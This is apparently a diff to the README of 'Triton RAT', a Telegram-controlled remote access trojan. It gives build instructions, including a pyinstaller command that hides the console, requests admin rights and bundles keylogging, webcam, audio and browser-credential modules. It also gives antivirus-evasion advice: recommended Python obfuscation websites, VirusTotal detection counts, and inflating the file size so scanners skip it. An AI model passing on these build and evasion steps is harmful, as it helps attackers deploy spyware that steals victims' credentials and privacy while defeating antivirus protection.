@@ -101,15 +101,20 @@ $ You can also use websites for obfuscation, I wrote about it a little below⬇�
 # Download fake_file_resizer, then run:
 $ python fake_file_resizer.py
 # Enter your exe, then enter output file name after that write output file size in mb(don't write mb).
-# Without manipulations with fake_file_resizer (no obfuscated) it shows 11 detects in virustotal, but with my ip is shows only 4 detects
+# Without manipulations with fake_file_resizer (no obfuscated) it shows 11 detects in virustotal, but with my fake_file_resizer + minifying it shows only 3 detects
 # Today this is the best method of obfuscation 
 # If you want to obfuscate CODE that I'm recomending to you these 2 websites:
-# First (6 detection):https://pyob.oxyry.com/ (use this after minifying the code ,because code's too long)
-# Second (5 detection): https://python-minifier.com/
+# First (4 detection):https://freecodingtools.org/tools/obfuscator/python (use this after minifying the code ,because code's too long)
+# Second (4 detection): https://python-minifier.com/
 # These are the best method if you don't want to use fake_file_resizer
 # Don't worry it detects by not popular antiviruses
 # First, copy the full code of Triton_RAT_Release.py then paste it in second link
-# After that, paste minified code in Triton_RAT_Release.py, then build it with pyinstaller⬇️
+# After that, paste minified/obfuscated code in Triton_RAT_Release.py, then build it with pyinstaller⬇️
+
+# Websites that I reccomend for obfuscation:
+# 1) https://python-minifier.com/ (The best)
+# 2) https://freecodingtools.org/tools/obfuscator/python 
+# 3) https://pyobfuscate.com/
 
 # After downloading pyinstaller run:
 $ pyinstaller --onefile --noconsole --uac-admin --hidden-import telebot --hidden-import pyautogui --hidden-import cv2 --hidden-import json --hidden-import base64 --hidden-import sqlite3 --hidden-import win32crypt --hidden-import Cryptodome.Cipher.AES --hidden-import shutil --hidden-import datetime --hidden-import numpy --hidden-import pyaudio --hidden-import wave --hidden-import random --hidden-import pyttsx3 --hidden-import pynput Triton_Rat_Release.py
@@ -127,8 +132,8 @@ $ run exe and bot started!
 
 ```
 You can also build exe with gui builder:
-<h4>Triton RAT GUI Builder: <a href="https://github.com/jayjayQy42/Triton_RAT-gui">Triton_RAT-gui</a></h4>
-Thanks to <a href="https://github.com/jayjayQy42">jayjayQy42</a>
+<h4>Triton RAT GUI Builder: </h4>
+This is not available due to some problems, but I plan to do it.
 
 <h1 align="left">If you want to avoid scanning some antiviruses you can make that⬇️</h1>
 More online scanners and antiviruses also most popular online antivirus scanner virustotal's max allowed file size is 650 MB.
@@ -140,9 +145,8 @@ Antiviruses, seeing the file size that it is large, will stupidly not check it! 
 <h4>Download here: https://github.com/WhiteeRabbit/fake_file_resizer/</h4>
 
 
-## 🏗️ Triton_Rat_Gui Builder (Huge thanks to [jayjayQy42](https://github.com/jayjayQy42)):  ##
-<h3>Triton RAT GUI Builder: <a href="https://github.com/jayjayQy42/Triton_RAT-gui">https://github.com/jayjayQy42/Triton_RAT-gui</a></h3>
-<h3>This man created builder for Triton rat, don't forget support him also!</h3>
+## 🏗️ Triton_Rat_Gui Builder :  ##
+This is not available due to some problems, but I plan to do it.
 
 ## 🛜 Triton_Rat V2 Proxy: ##
 If the telegram api does not work in your country, then use the version with a proxy. In the proxy version, everything works the same as in the regular version.
